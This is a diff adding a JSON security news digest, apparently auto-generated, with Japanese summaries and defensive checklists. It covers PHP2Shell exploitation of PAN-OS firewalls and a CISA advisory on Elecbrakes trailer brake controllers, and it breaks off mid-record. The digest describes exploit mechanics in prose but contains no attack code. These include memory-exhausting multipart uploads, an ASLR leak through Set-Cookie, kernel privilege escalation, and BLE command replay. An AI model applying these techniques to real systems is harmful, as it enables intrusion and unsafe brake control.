@@ -1,0 +1,2706 @@
+{
+  "date": "2026-11-20",
+  "generatedAt": "2026-11-19T22:16:16.126Z",
+  "window": {
+    "start": "2026-11-18T22:00:00.000Z",
+    "end": "2026-11-19T22:00:00.000Z"
+  },
+  "summary": [
+    "実際の攻撃で悪用された脆弱性が重なり、管理画面や古い製品が狙われた。",
+    "PHP、NGINX、Javaなど基盤ソフトの重大な脆弱性対応が相次いだ。",
+    "AIエージェントはツール接続や業務データ連携など、実運用への組み込みが進んだ。",
+    "一方で、承認・停止・取り消しを組み込む安全なエージェント設計も現れた。"
+  ],
+  "outlook": "現状は、脆弱性や認証情報を起点に開発基盤・クラウド・管理面へ被害が連鎖し、AIエージェントの実運用化と権限制御が同時に進みつつある。今後は、機能追加の速さより承認・停止・監査・復旧を組み込んだ安全な自動化と、侵害前提の運用設計が焦点になりそうだ。",
+  "top": [
+    {
+      "source": "rss",
+      "sourceLabel": "The Hacker News",
+      "title": "Everything Is a Web Application, Including Your Firewall",
+      "url": "https://thehackernews.com/2026/11/everything-is-web-application-including.html",
+      "publishedAt": "2026-11-19T11:52:23.000Z",
+      "author": "info@thehackernews.com (The Hacker News)",
+      "authorDetail": {
+        "name": "info@thehackernews.com (The Hacker News)"
+      },
+      "tags": [],
+      "snippet": "One of the early targets of PHP2Shell exploitation was the firewall. On October 28, Palo Alto Networks confirmed that attackers were exploiting the two PHP vulnerabilities, CVE-2026-109618 and CVE-2026-109619, against PAN-OS management interfaces exposed to the internet. Both flaws let anyone execute code on the web server without authentication. The disclosure itself went a little wrong.",
+      "body": "One of the early targets of PHP2Shell exploitation was the firewall. On October 28, Palo Alto Networks confirmed that attackers were exploiting the two PHP vulnerabilities, CVE-2026-109618 and CVE-2026-109619, against PAN-OS management interfaces exposed to the internet. Both flaws let anyone execute code on the web server without authentication. The disclosure itself went a little wrong. Details leaked on October 20, ahead of the coordinated release, and the PHP project shipped an emergency patch the next day.\n\nThe vulnerabilities require no authentication, but they are not easy to exploit reliably. It takes skill and additional knowledge about the target system. Where it matters a lot is appliances, which run identical, often outdated software that an attacker can study in advance. That is the bigger picture. An awful lot of web applications control critical devices in your network. Almost anything is a web application to some extent. That often goes unrecognized, and as a result those applications aren't adequately protected.\n\nEverything is a web application. That is the motto of the SANS course I teach, SEC522: Application Security: Securing Web Applications, APIs, and Microservices. Web application security has traditionally been treated as a developer issue, yet anyone protecting a network must understand how web applications work to properly defend them.\n\nWhy Appliances Are the Softer Target\n\nOn ordinary web servers, address space layout randomization (ASLR) is one of the features that makes exploitation harder. It shuffles where code and data sit in memory, so an exploit can't rely on fixed addresses. VulnCheck's early analysis found the bugs exploitable on ARM64 systems and on x86 systems without ASLR. Few public exploits bypassed ASLR on x86-64, and the one VulnCheck confirmed worked only against a single PHP build. VulnCheck's own exploit chained a memory leak to get code execution with ASLR enabled.\n\nAppliances change that math, not because the protections are missing, but because every device on a given software version runs the same binaries, so an attacker can work out memory offsets in advance. The PAN-OS exploit still had to defeat ASLR, leaking the libphp.so base address through the Set-Cookie header, and SELinux confined the resulting shell. PAN-OS also ships end-of-life PHP versions (8.0.30 and 7.4.33). Israeli security firm Dream, working with Palo Alto Networks on the investigation, found the attacker had obtained PAN-OS firmware, decrypted it, extracted the PHP libraries, and built precise memory profiles for nine software versions. The actor then chained PHP2Shell with a Linux kernel flaw (Fragnesia, CVE-2026-46300) to gain root on 25 systems (24 firewalls and one management server) in the U.S., Japan, Taiwan, and South Korea.\n\nWeb application security tends to focus on large, cloud-based applications. It's often the little things, the mosquitoes on the internet, that do you in. Appliances run predictable, often outdated software, and they are everywhere.\n\nHTTP Is More Complex Than Your Defenses Assume\n\nHTTP is a very complex protocol with lots of options. To upload a file, a client doesn't have to send it in one piece. It can send the body in chunks without declaring its total length, and, if the server decompresses request bodies, compress it, which makes it difficult for a web server to calculate how much memory it needs to store it. Memory-safety bugs remain common as a result, in web applications and in the web servers running them. In PHP2Shell, a crafted multipart upload pushes PHP past its memory limit while it is still parsing the request, before any application code runs. The bugs are in what PHP leaves behind when it aborts the request: uninitialized request memory (CVE-2026-109618) and a pointer to freed memory (CVE-2026-109619). The request doesn't need to be large, either. Deeply nested, empty file fields make PHP allocate far more memory than the body contains, so a request well under the default 8 MB post_max_size can still exhaust the default 128 MB memory limit.\n\nDefenders must understand the protocol to know what these vulnerabilities look like, for example to write signatures that detect the exploits. The same complexity limits the middle boxes we rely on. They can even interfere in ways nobody planned. Intruder found that nginx in front of PAN-OS buffered chunked request bodies, which broke public exploit chains. Web application firewalls are often not adequate, and file uploads are key functionality for a lot of web applications, so blocking them outright isn't an option.\n\nThat takes out many of the traditional defenses. What remains is knowing where your critical web applications are. Identify them, starting with the admin interfaces on your firewalls and other network equipment, and restrict access to them. Palo Alto's own guidance for PHP2Shell was to remove internet access to management interfaces and limit them to trusted internal IP addresses. If you rely on a web application firewall, configure it properly and understand how much protection it does and doesn't provide.\n\nRisk Was the Hardest Call\n\nThe clearest lesson from PHP2Shell is how difficult it can be to accurately determine the risk from a vulnerability like this. Prioritization is always a big issue for defenders, particularly with today's flood of vulnerabilities, and this one was hard to read from every angle.\n\nThe scores told different stories. The PHP project rated both flaws 9.2 under CVSS 4.0, and Fortinet's PSIRT listed 9.8 under CVSS v3. Palo Alto initially scored the issue 8.7 for its own products and listed it at moderate urgency, raised it to 9.2 Critical with the highest urgency on October 27, and confirmed exploitation a week after its advisory went out. Many public proofs of concept didn't work, so a flood of attempts in your logs said little about whether a given server was at risk. And PHP core developer Gina Peter Banyard warned that one early workaround, turning off session upload progress, was not enough on its own.\n\nWe are adding these lessons to SEC522: how to assess risk, how protections like ASLR reduce it, and why appliances remain softer targets.\n\nDefending What Runs on HTTP\n\nI will be teaching SEC522: Application Security: Securing Web Applications, APIs, and Microservices at SANS Cyber Defense Initiative 2026, December 14-18 in Washington, D.C., and Live Online. The course starts with how HTTP works, including HTTP/2 and HTTP/3, and covers file upload handling, API security, and AI endpoints across 17 hands-on labs and a Defend the Flag capstone. It is built for the people who defend web applications, whether or not they wrote them.\n\nRegister for SEC522 at SANS Cyber Defense Initiative 2026.\n\nNote: This article has been written and contributed by Dr. Johannes Ullrich, Dean of Research at SANS Technology Institute.\n\nFound this article interesting? This article is a contributed piece from one of our valued partners. Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.",
+      "metrics": {},
+      "sourceWeight": 3,
+      "feedCategory": "security",
+      "id": "238f035ce72db0f4",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.53,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [],
+      "buzz": false,
+      "score": 91,
+      "titleJa": "ファイアウォールも攻撃対象になるWebアプリ化の現実",
+      "oneLiner": "PHPの脆弱性を使う攻撃がインターネット公開されたPAN-OS管理画面に及んだ。",
+      "takeaways": [
+        "ファイアウォールの管理画面もWebアプリとして攻撃された。",
+        "認証なしで管理用サーバー上のコードを実行できた。",
+        "Palo Alto Networksは2件の脆弱性悪用を10月28日に確認した。"
+      ],
+      "keywords": [
+        "PAN-OS",
+        "Palo Alto Networks",
+        "PHP2Shell",
+        "CVE-2026-109618",
+        "CVE-2026-109619"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": "Check Point PHP2Shell攻撃",
+      "readingMinutes": 6,
+      "payoff": "decide",
+      "durability": "durable",
+      "imageUrl": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiC0roCfV92el2-gLSGwmumyjXgCjHookzwGjft2a6UWPZA1QvyrazDNLTvlZrF1F5iagg74JxnPEXbnK60OEeJuFNo2Fc2xcNSnJCeNw9BLu_y-lsRhrpO6s1End2gdDDlRU_r4wysTiiJS4ZKPDTmWK152psFdhxRizlSJZFCjnYr6nnamRsUciEJui4/s1700-nu-rw-lo-l85-e365/php-app.jpg",
+      "rank": 1,
+      "deep": {
+        "summary": "PHP2Shellとして知られるCVE-2026-109618とCVE-2026-109619が、インターネット公開されたPAN-OS management interfacesに対して実際に悪用された。認証なしでPHPのWebサーバー上のコードを実行でき、攻撃者はPAN-OS firmwareを解析してASLR回避に必要なメモリ情報を準備した。さらにLinux kernel flawのFragnesia（CVE-2026-46300）を連鎖させ、24台のfirewallと1台のmanagement server、計25システムでroot権限を取得した。記事は、firewallなどのappliancesも重要なweb applicationとして扱い、管理画面のインターネット公開を止めるべきだと指摘する。前回までに判明していたDynamicCLI悪用や内部資産への展開に加え、今回、PAN-OSを狙った初期侵入の詳細と攻撃規模が示された。",
+        "prerequisites": [
+          {
+            "term": "PHP2Shell",
+            "stumblingPoint": "記事は「PHP2Shell」でCVE-2026-109618とCVE-2026-109619をまとめて説明しているが、個別の脆弱性との関係が読み取りにくい。",
+            "explanation": "PHP2Shellは、細工したmultipart uploadでPHPのリクエスト処理を異常終了させ、残存した未初期化メモリや解放済みメモリへのポインタを悪用する攻撃手法の呼び名です。CVE-2026-109618はuninitialized request memory、CVE-2026-109619はpointer to freed memoryに対応します。つまり、通常のアプリケーションコードが動く前のPHP自身の入力処理が攻撃対象です。"
+          },
+          {
+            "term": "PAN-OS management interfaces",
+            "stumblingPoint": "記事は「PAN-OS management interfaces exposed to the internet」を初期侵入先としているが、通常の公開Webサービスとの違いが分からないと危険性を見落とす。",
+            "explanation": "PAN-OS management interfacesは、firewallの設定や運用を管理するWeb管理画面です。業務アプリの公開ページではなく、ネットワーク防御装置そのものを操作する入口なので、ここでコード実行されると保護対象の通信経路を内側から操作されます。記事はこの管理画面がインターネットから到達可能だったことを攻撃成立の条件として扱っています。"
+          },
+          {
+            "term": "ASLR",
+            "stumblingPoint": "記事は「ASLR」を回避するためにlibphp.soのbase addressを漏えいさせたと書くが、なぜ同じappliancesが攻撃を容易にするかが読み取りにくい。",
+            "explanation": "ASLRは、実行コードやデータのメモリアドレスを毎回変えて、攻撃者が固定アドレスを前提にすることを妨げる仕組みです。同じソフトウェアバージョンのappliancesは同じバイナリを搭載するため、攻撃者が事前にfirmwareを解析してメモリ配置を推定しやすくなります。今回の攻撃ではSet-Cookie header経由でlibphp.soのbase addressを漏えいさせ、ASLR有効環境でもコード実行につなげました。"
+          },
+          {
+            "term": "multipart upload",
+            "stumblingPoint": "記事は「crafted multipart upload」がPHPのmemory limitを超えさせると説明するが、本文サイズが小さくても枯渇する理由が省略されている。",
+            "explanation": "multipart uploadは、フォームの複数フィールドやファイルを1つのHTTPリクエストで送る形式です。PHPは深くネストした空のfile fieldsを解析すると、実際のbodyサイズ以上のメモリを確保します。そのため、default 8 MBのpost_max_size未満のリクエストでも、default 128 MBのmemory limitを消費させられます。"
+          },
+          {
+            "term": "SELinux",
+            "stumblingPoint": "記事は「SELinux confined the resulting shell」と短く述べるが、コード実行できたのに直ちにrootにならない理由が分からない。",
+            "explanation": "SELinuxは、プロセスがファイルや機能へアクセスできる範囲をポリシーで制限する仕組みです。PHP2ShellでWebサーバー上のshellを得ても、そのshellには制限された権限しかありません。記事の攻撃では、その制約を越えてrootを得るために、別のLinux kernel flawであるFragnesiaを追加利用しました。"
+          },
+          {
+            "term": "Fragnesia",
+            "stumblingPoint": "記事はPHP2Shellに「Fragnesia, CVE-2026-46300」をchainしたと書くが、初期侵入の脆弱性と同じものに見えやすい。",
+            "explanation": "FragnesiaはPHPの認証なしコード実行とは別のLinux kernel flawです。PHP2ShellがWebサーバー上でコードを動かす段階を担い、Fragnesiaがその後の権限昇格を担います。この分離を理解すると、Web管理画面の修正だけでなく、基盤OSやfirmware全体の更新が必要だった理由が分かります。"
+          },
+          {
+            "term": "Web application firewall",
+            "stumblingPoint": "記事は「Web application firewalls are often not adequate」としながら、file uploadsを止められないという実務上の制約を挙げている。",
+            "explanation": "Web application firewallはHTTPリクエストを検査して攻撃パターンを遮断する中継防御です。しかし、chunked request bodiesの扱いなどで中継機器と背後のWebサーバーの解釈がずれると、検査結果と実際の処理が一致しません。file uploadsは正規機能でもあるため全面遮断しにくく、記事はWAFを管理画面の公開制限やパッチの代替にしてはいけないと示しています。"
+          }
+        ],
+        "visual": {
+          "type": "flow",
+          "title": "PHP2Shell攻撃の連鎖",
+          "steps": [
+            {
+              "label": "公開管理画面",
+              "detail": "PAN-OS管理画面を外部公開"
+            },
+            {
+              "label": "PHP2Shell",
+              "detail": "認証なしでPHPコード実行"
+            },
+            {
+              "label": "ASLR回避",
+              "detail": "libphp.soのbase addressを取得"
+            },
+            {
+              "label": "root昇格",
+              "detail": "Fragnesiaでkernel権限を突破"
+            },
+            {
+              "label": "25システム",
+              "detail": "24 firewallと1 serverに到達"
+            }
+          ]
+        },
+        "figures": [],
+        "code": null,
+        "relatedLinks": [],
+        "readingMinutes": 8,
+        "lane": "security",
+        "whatHappened": [
+          "2026-10-28 Palo Alto NetworksがPAN-OS管理画面への悪用を確認",
+          "CVE-2026-109618/109619で認証なしコード実行が可能",
+          "Fragnesiaを連鎖し、25システムでroot権限を取得",
+          "対象は米国・日本・台湾・韓国の24 firewallsと1 server"
+        ],
+        "attackChain": [
+          {
+            "stage": "initial-access",
+            "detail": "インターネット公開PAN-OS管理画面へPHP2Shellを悪用"
+          },
+          {
+            "stage": "other",
+            "detail": "PAN-OS firmwareを解析し9バージョンのメモリ情報を準備"
+          },
+          {
+            "stage": "other",
+            "detail": "multipart uploadでPHPのメモリ処理を破壊"
+          },
+          {
+            "stage": "privilege-escalation",
+            "detail": "Fragnesia（CVE-2026-46300）でroot権限を取得"
+          },
+          {
+            "stage": "impact",
+            "detail": "24 firewallsと1 management serverの計25台に到達"
+          }
+        ],
+        "personal": [
+          "管理しているfirewallの管理画面をインターネットから閉じ、trusted internal IPだけに制限する。",
+          "PAN-OSと搭載PHPのバージョンを確認し、Palo Alto NetworksのPHP2Shell対策を適用する。",
+          "session upload progressの無効化だけを対策完了と扱わず、ベンダー修正を適用する。",
+          "管理画面の公開状況は外部から確認せず、クラウドや社内の許可済み監視元から到達範囲を点検する。"
+        ],
+        "organization": [
+          {
+            "kind": "tech",
+            "action": "初期侵入を止めるため、PAN-OS管理画面をインターネット非公開にし、trusted internal IPへ限定する。"
+          },
+          {
+            "kind": "tech",
+            "action": "PHP2ShellのCVE-2026-109618/109619とFragnesiaのCVE-2026-46300を含むfirmware・OS修正を適用する。"
+          },
+          {
+            "kind": "ops",
+            "action": "multipart uploadやchunked requestの検査結果を実サーバーの解釈と照合し、WAFだけで防御完了と判定しない。"
+          },
+          {
+            "kind": "ops",
+            "action": "外部公開されたfirewall管理画面を棚卸しし、公開中の機器は優先して到達元とバージョンを確認する。"
+          },
+          {
+            "kind": "org",
+            "action": "appliancesの同一firmwareを一括管理し、ベンダーの緊急修正と実際の悪用確認を受けた更新を即時展開する。"
+          }
+        ],
+        "relevance": [
+          "PAN-OSの管理画面をインターネットへ公開している企業",
+          "firewallやネットワーク機器をWeb管理している人",
+          "WAFでfile uploadsやchunked requestsを処理している組織"
+        ],
+        "unknowns": [
+          "攻撃者の身元や中国系グループとの関係は未確定",
+          "攻撃の破壊目的は未確定",
+          "25システム以外の被害範囲は本文で未確定"
+        ],
+        "whatsNew": "Palo Alto Networksは2026-10-28、CVE-2026-109618/109619が公開PAN-OS管理画面で悪用されたと確認した。firmware解析とFragnesiaにより25システムでroot取得に至った。"
+      }
+    },
+    {
+      "source": "rss",
+      "sourceLabel": "CISA Advisories",
+      "title": "Elecbrakes EB2, VM1, ELBC2000",
+      "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-323-02",
+      "publishedAt": "2026-11-19T12:00:00.000Z",
+      "author": "CISA",
+      "authorDetail": {
+        "name": "CISA"
+      },
+      "tags": [],
+      "snippet": "View CSAF Summary Successful exploitation of these vulnerabilities could allow an attacker to gain control of the brakes of a trailer, modify the firmware, disable the brake lights, modify the brake conditions or disable other critical safety features. The following versions of Elecbrakes EB2, VM1, ELBC2000 are affected: EB2 <=3.0.4.2.0 (CVE-2026-124281, CVE-2026-125273, CVE-2026-96805) ELBC2000 v…",
+      "body": "View CSAF \n\n Summary\n\n Successful exploitation of these vulnerabilities could allow an attacker to gain control of the brakes of a trailer, modify the firmware, disable the brake lights, modify the brake conditions or disable other critical safety features. \n\n The following versions of Elecbrakes EB2, VM1, ELBC2000 are affected:\n\n \n EB2 <=3.0.4.2.0 (CVE-2026-124281, CVE-2026-125273, CVE-2026-96805)\n\n ELBC2000 vers:all/* (CVE-2026-124281, CVE-2026-125273, CVE-2026-96805)\n\n VM1 <1.3.4.2.1 (CVE-2026-124281, CVE-2026-125273, CVE-2026-96805)\n\n \n \n \n \n \n CVSS \n Vendor \n Equipment \n\n \n \n \n v3 9.6 \n Elecbrakes \n EB2 \n\n \n \n \n \n \n 3 Vulnerabilities \n\n \n \n \n Exposed Dangerous Method or Function, Authentication Bypass by Capture-replay, Missing Authentication for Critical Function \n\n \n \n\n Background\n\n \n Critical Infrastructure Sectors: Transportation Systems\n\n Countries/Areas Deployed: Australia, New Zealand\n\n Company Headquarters Location: Australia\n\n \n \n Vulnerabilities\n\n Expand All + \n\n \n CVE-2026-124281\n\n The affected product uses an unprotected firmware-update channel, which may allow for unauthorized firmware modification.\n\n Read More \n\n \n 3 Affected Products\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Additional Metrics\n\n Relevant CWE: CWE-749 Exposed Dangerous Method or Function \n\n \n \n \n \n CVSS Version \n Base Score \n Base Severity \n Vector String \n\n \n \n \n 3.1 \n 6.1 \n MEDIUM \n CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L \n\n \n 4.0 \n 5.3 \n MEDIUM \n CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:L/SA:L \n\n \n \n\n \n View CVE Details \n\n \n CVE-2026-125273\n\n No replay or command-integrity protection. Commands lack sequence numbers, nonces, or session tokens; captured commands can be replayed, and the last command persists across sessions.\n\n Read More \n\n \n 6 Affected Products\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Additional Metrics\n\n Relevant CWE: CWE-294 Authentication Bypass by Capture-replay \n\n \n \n \n \n CVSS Version \n Base Score \n Base Severity \n Vector String \n\n \n \n \n 3.1 \n 9.6 \n CRITICAL \n CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H \n\n \n 4.0 \n 8.5 \n HIGH \n CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H/S:P \n\n \n \n\n \n View CVE Details \n\n \n CVE-2026-96805\n\n The affected product has an unauthenticated command injection, which may allow an in-range BLE device to gain access to write to the control interface and influence braking with no authentication or pairing.\n\n Read More \n\n \n 9 Affected Products\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes ELBC2000 vers:all/*\n\n \n Product Status: known_affected\n\n Remediations\n\n \n None available \nThis device is the predecessor to the EB2 and the VM1 and is no longer sold. The vendor is determining how to address these vulnerabilities for this particular controller.\n\n \n Elecbrakes EB2 <=3.0.4.2.0\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (EB2 3.0.4.4.3). Users should open the Elecbrakes app and install the firmware update.\n\n \n Elecbrakes VM1 <1.3.4.2.1\n\n \n Product Status: known_affected\n\n Remediations\n\n \n Vendor fix \nElecbrakes has released updated firmware (VM1 1.3.4.2.1). Users should open the Elecbrakes app and install the firmware update.\n\n \n Additional Metrics\n\n Relevant CWE: CWE-306 Missing Authentication for Critical Function \n\n \n \n \n \n CVSS Version \n Base Score \n Base Severity \n Vector String \n\n \n \n \n 3.1 \n 9.6 \n CRITICAL \n CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H \n\n \n 4.0 \n 8.5 \n HIGH \n CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:H/SC:N/SI:H/SA:H/S:P \n\n \n \n\n \n View CVE Details \n\n \n Acknowledgments\n\n \n Patrick Forck and Jeremy McCarthy of Element Digital reported these vulnerabilities to CISA.\n\n \n \n Recommended Practices\n\n CISA recommends users take defensive measures to minimize the risk of exploitation of these vulnerabilities.\n\n \n Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet .\n\n Locate control system networks and remote devices behind firewalls and isolating them from business networks.\n\n When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.\n\n \n CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.\n\n CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics . Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies .\n\n CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets .\n\n Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies .\n\n Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.\n\n CISA also recommends users take the following measures to protect themselves from social engineering attacks:\n\n \n Do not click web links or open attachments in unsolicited email messages.\n\n Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams.\n\n Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks.\n\n \n No known public exploitation specifically targeting these vulnerabilities has been reported to CISA at this time.\n\n \n Revision History\n\n \n Initial Release Date: 2026-11-19\n\n \n \n \n \n Date \n Revision \n Summary \n\n \n \n \n 2026-11-19 \n 1 \n Initial Publication \n\n \n \n \n Legal Notice and Terms of Use",
+      "metrics": {},
+      "sourceWeight": 4,
+      "feedCategory": "security",
+      "id": "67374842d9bcfb58",
+      "lang": "en",
+      "foundIn": [
+        "rss"
+      ],
+      "preScore": 0.6216666666666667,
+      "popularityPercentile": 0.5,
+      "matchedTopics": [],
+      "buzz": false,
+      "score": 82,
+      "titleJa": "Elecbrakes製品のブレーキ制御に関わる脆弱性",
+      "oneLiner": "Elecbrakesの三製品にブレーキ制御を奪われる重大な脆弱性が確認された。",
+      "takeaways": [
+        "トレーラーのブレーキを外部から操作できた。",
+        "制御条件やファームウェアを変更できた。",
+        "対象製品の最高評価は10点満点中9.6だった。"
+      ],
+      "keywords": [
+        "Elecbrakes",
+        "EB2",
+        "VM1",
+        "ELBC2000",
+        "CVE-2026-124281",
+        "CVE-2026-125273"
+      ],
+      "category": "調査・考察",
+      "lane": "security",
+      "incident": null,
+      "readingMinutes": 4,
+      "payoff": "aware",
+      "durability": "durable",
+      "rank": 2,
+      "deep": {
+        "summary": "CISAは、Elecbrakesのトレーラー用ブレーキコントローラーEB2、VM1、ELBC2000に3件の脆弱性があると公表した。攻撃者は通信範囲内のBLEデバイスから、認証やペアリングなしで制御インターフェースへコマンドを書き込める。コマンドにはsequence numbers、nonces、session tokensがなく、取得済みコマンドのreplayや前回コマンドのセッション間持続も可能である。さらに、保護されていないfirmware-update channelを通じてファームウェアを不正変更できる。悪用時にはブレーキ制御、ブレーキライト、ブレーキ条件などの安全機能が変更・無効化される可能性がある。EB2とVM1には修正版があるが、旧製品ELBC2000には2026-11-19時点で対策版がない。",
+        "prerequisites": [
+          {
+            "term": "BLE",
+            "stumblingPoint": "記事は「in-range BLE device」と書いているが、BLEを知らないと攻撃に必要な距離条件が読み取れない。",
+            "explanation": "BLEは近距離無線通信規格で、スマートフォンなどが周辺機器と通信するために使われる。この記事では、インターネット越しではなく、攻撃者のBLEデバイスがコントローラーの通信範囲内に入ることが初期条件になる。"
+          },
+          {
+            "term": "firmware-update channel",
+            "stumblingPoint": "記事は「unprotected firmware-update channel」と書いているが、更新経路の保護不足が何を可能にするかが分かりにくい。",
+            "explanation": "firmware-update channelは、機器の組み込みソフトウェアを更新する通信経路である。ここに認証や改ざん検証がないため、正規の更新処理を悪用して、攻撃者が機器の動作を決めるファームウェアを書き換えられるという意味である。"
+          },
+          {
+            "term": "replay",
+            "stumblingPoint": "記事は「captured commands can be replayed」と書いているが、過去の通信の再送がなぜ危険かを知らないと影響が読めない。",
+            "explanation": "replayは、以前に正当な操作として送られたコマンドを記録し、後から同じ内容で再送する攻撃である。現在の利用者や接続状態を確認できない設計では、古いブレーキ操作が別の時点でも有効になり、安全状態と無関係に制御される。"
+          },
+          {
+            "term": "sequence numbers",
+            "stumblingPoint": "記事はコマンドに「sequence numbers、nonces、session tokens」がないと指摘しているが、これらがないと何を検証できないかが分からない。",
+            "explanation": "sequence numbersはコマンドの順序を、noncesは一度限りの値を、session tokensは現在の通信セッションを識別する情報である。これらがないため、受信側はコマンドが新しいものか、現在のセッション向けか、以前の通信のコピーかを判定できない。"
+          },
+          {
+            "term": "unauthenticated command injection",
+            "stumblingPoint": "記事は「unauthenticated command injection」と書いているが、認証なしのコマンド注入が制御機器で何を意味するかが読み取りにくい。",
+            "explanation": "unauthenticated command injectionは、利用者確認なしに外部から制御用コマンドを書き込める状態である。この記事では、BLEデバイスをペアリングして正規利用者と確認する手順もないため、通信範囲内の攻撃者がブレーキ制御に影響できる。"
+          },
+          {
+            "term": "ELBC2000",
+            "stumblingPoint": "記事はELBC2000をEB2とVM1のpredecessorとするが、修正版の対象外である点を見落としやすい。",
+            "explanation": "ELBC2000はEB2とVM1の前世代にあたる、現在は販売されていないコントローラーである。影響を受けるバージョンは「all/*」で、2026-11-19時点ではベンダーが対処方法を検討中であり、利用者が適用できる修正版は示されていない。"
+          }
+        ],
+        "visual": {
+          "type": "flow",
+          "title": "攻撃から影響まで",
+          "steps": [
+            {
+              "label": "通信範囲に入る",
+              "detail": "攻撃者のBLEデバイスが接近"
+            },
+            {
+              "label": "認証を回避",
+              "detail": "ペアリングなしで制御IFへ接続"
+            },
+            {
+              "label": "コマンドを送る",
+              "detail": "注入または取得済みコマンドを再送"
+            },
+            {
+              "label": "安全機能に影響",
+              "detail": "ブレーキやライトを変更・無効化"
+            }
+          ]
+        },
+        "figures": [],
+        "code": null,
+        "relatedLinks": [
+          {
+            "label": "CISA ICSA-26-323-02",
+            "url": "https://www.cisa.gov/news-events/ics-advisories/icsa-26-323-02"
+          }
+        ],
+        "readingMinutes": 5,
+        "lane": "security",
+        "whatHappened": [
+          "2026-11-19 CISAがEB2、VM1、ELBC2000の3脆弱性を公表",
+          "悪用時にブレーキ、ブレーキライト、安全機能を制御可能",
+          "EB2とVM1は修正版あり、ELBC2000は対策未提供"
+        ],
+        "attackChain": [
+          {
